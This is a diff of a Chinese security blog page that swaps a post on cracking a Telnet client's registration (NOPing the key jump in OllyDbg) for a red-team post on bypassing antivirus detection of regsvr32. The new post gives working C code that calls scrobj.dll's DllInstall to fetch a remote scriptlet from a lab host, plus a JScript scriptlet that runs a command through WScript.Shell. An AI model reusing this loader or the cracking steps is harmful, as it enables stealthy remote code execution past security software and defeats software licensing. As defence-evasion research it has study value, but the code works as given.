@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>使用DarkDe通过按钮事件寻找关键代码部分 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="使用DarkDe通过按钮事件寻找关键代码部分 | 九世的博客">
+  <title>regsvr32绕过 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="regsvr32绕过 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1593,9 +1593,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-使用DarkDe通过按钮事件寻找关键代码部分" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-regsvr32绕过" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">使用DarkDe通过按钮事件寻找关键代码部分</h1>
+        <h1 class="article-title">regsvr32绕过</h1>
     
     <div class="article-meta">
         
@@ -1604,14 +1604,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-10-20 20:13</time>
+        创建时间:<time class="date" title="更新时间: 2021-01-20 01:54:55">2021-01-20 01:46</time>
         
     </div>
     <div class="article-meta">
@@ -1633,7 +1633,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1648,10 +1648,49 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一般的PE关键字搜索不到关键字，等其他办法试完之后，找不到关键代码部分。肯定是非常痛苦的，但是我们可以通过DarKDe来定位布局事件来寻找关键代码。<br><img src="https://s1.ax1x.com/2018/10/20/iBVCwQ.jpg" alt=""></p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><pre><code>此文接着上次的Telnet连接器进行破解，上次我直接搜关键字进行破解的。这次通过定位按钮的段地址
-寻找关键代码。
-</code></pre><p>使用DarkDe注意事项：软件必须是没有壳的，有壳是加载不出使用的函数<br>这里我的壳已经脱掉了，用PEID可以明显的看到是BC++写的<br><img src="https://s1.ax1x.com/2018/10/20/iBVPoj.png" alt="iBVPoj.png"><br>载入DarkDe<br><img src="https://s1.ax1x.com/2018/10/20/iBVVS0.png" alt="iBVVS0.png"><br>点击进程寻找对应按钮的数量<br><img src="https://s1.ax1x.com/2018/10/20/iBVZlV.md.png" alt="iBVZlV.md.png"><br>打开按钮事件，复制第一个段地址，在OD里进行条件搜索，并对其下断点<br><img src="https://s1.ax1x.com/2018/10/20/iBV3f1.md.png" alt="iBV3f1.md.png"><br>对剩下的两个按钮事件步骤一样下断点<br>因为我们这里要破解注册，所以我们把注意力放在注册的按钮上<br><img src="https://s1.ax1x.com/2018/10/20/iBVa0e.md.png" alt="iBVa0e.md.png"><br>既然这个断点是注册按钮的，那么下面的指令肯定是处理注册的，把注意力放下面<br>发现注册成功的语句，寻找跳转语句<br><img src="https://s1.ax1x.com/2018/10/20/iBV0kd.png" alt="iBV0kd.png"><br>对第一个je下断，发现是关键跳，尝试将其nop掉看看是否成功，重启软件发现注册成功<br><img src="https://s1.ax1x.com/2018/10/20/iBVHXT.png" alt="iBVHXT.png"><br>转载请注明：转自422926799.github.io</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>regsvr32为白名单，但是面对各种杀软和defender。早已被拦截，虽然可以命令行绕过，但是在看到某文章后决定复现一波<br>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247486668&amp;idx=1&amp;sn=b490c44dd870307a574818fd2d56e4a3&amp;chksm=fb183ffecc6fb6e80f6ff64781325ebdfc8edc14462b2c6921213dcb72845dc243a2dc6f5176" target="_blank" rel="noopener">regsvr32绕过</a></p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>regsvr32远程下载是调用scrobj.dll里的DllInstall函数实现的下载<br><img src="https://s3.ax1x.com/2021/01/20/sRKxoV.png" alt=""></p>
+<p>IDA分析<br><img src="https://s3.ax1x.com/2021/01/20/sRMSiT.md.png" alt=""></p>
+<p>API Monitor跟踪这个dll<br><img src="https://s3.ax1x.com/2021/01/20/sRM9WF.png" alt=""></p>
+<p>搜索API关键名称CreateURLMonikerEx，找到函数位置<br><img src="https://s3.ax1x.com/2021/01/20/sRMiQJ.png" alt=""></p>
+<p>搜索该函数调用点在sub_1800072D0，符合DllInstall函数调用<br><img src="https://s3.ax1x.com/2021/01/20/sRMZo6.png" alt=""></p>
+<p>调用该函数实现regsvr32实现功能</p>
+<pre><code class="C">#include &quot;stdafx.h&quot;
+#include &lt;Windows.h&gt;
+#define error_print(name){printf(&quot;%s,Error Code:%d&quot;,GetLastError());exit(1);}
+int main()
+{
+        LPCSTR dllpath = &quot;c:\\windows\\system32\\scrobj.dll&quot;;
+        HMODULE load = LoadLibraryA(dllpath);
+        if (load == NULL) {
+               error_print(&quot;LoadLibraryA&quot;);
+        }
+        FARPROC getmodule = GetProcAddress(load, &quot;DllInstall&quot;);
+        if (getmodule == NULL) {
+               error_print(&quot;GetProcAddress&quot;);
+        }
+        ((void(*)(BOOL, TCHAR*))getmodule)(FALSE, L&quot;http://192.168.137.227/testx.txt&quot;); //指针函数调用
+    return 0;
+}
+
+</code></pre>
+<p>testx.txt</p>
+<pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;component id=&quot;TESTING&quot;&gt;
+&lt;registration
+  progid=&quot;TESTING&quot;
+  classid=&quot;{A1112221-0000-0000-3000-000DA00DABFC}&quot; &gt;
+  &lt;script language=&quot;JScript&quot;&gt;
+    &lt;![CDATA[
+      var wsc = &quot;WScript.Shell&quot;;
+      var com = &quot;calc&quot;;
+      com.concat(&quot;.&quot;,&quot;e&quot;,&quot;x&quot;,&quot;e&quot;);
+      var foo = new ActiveXObject(wsc).Run(com);
+    ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/component&gt;
+</code></pre><p><img src="https://s3.ax1x.com/2021/01/20/sRMQQH.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1661,12 +1700,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>使用DarkDe通过按钮事件寻找关键代码部分</p>
+    <p><span class="copy-title">文章标题:</span>regsvr32绕过</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-10-20, 20:13:59</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/85f395de.html" title="使用DarkDe通过按钮事件寻找关键代码部分">http://422926799.github.io/posts/85f395de.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-01-20, 01:46:02</p>
+    <p><span class="copy-title">最后更新:</span>2021-01-20, 01:54:55</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/b2680e3b.html" title="regsvr32绕过">http://422926799.github.io/posts/b2680e3b.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
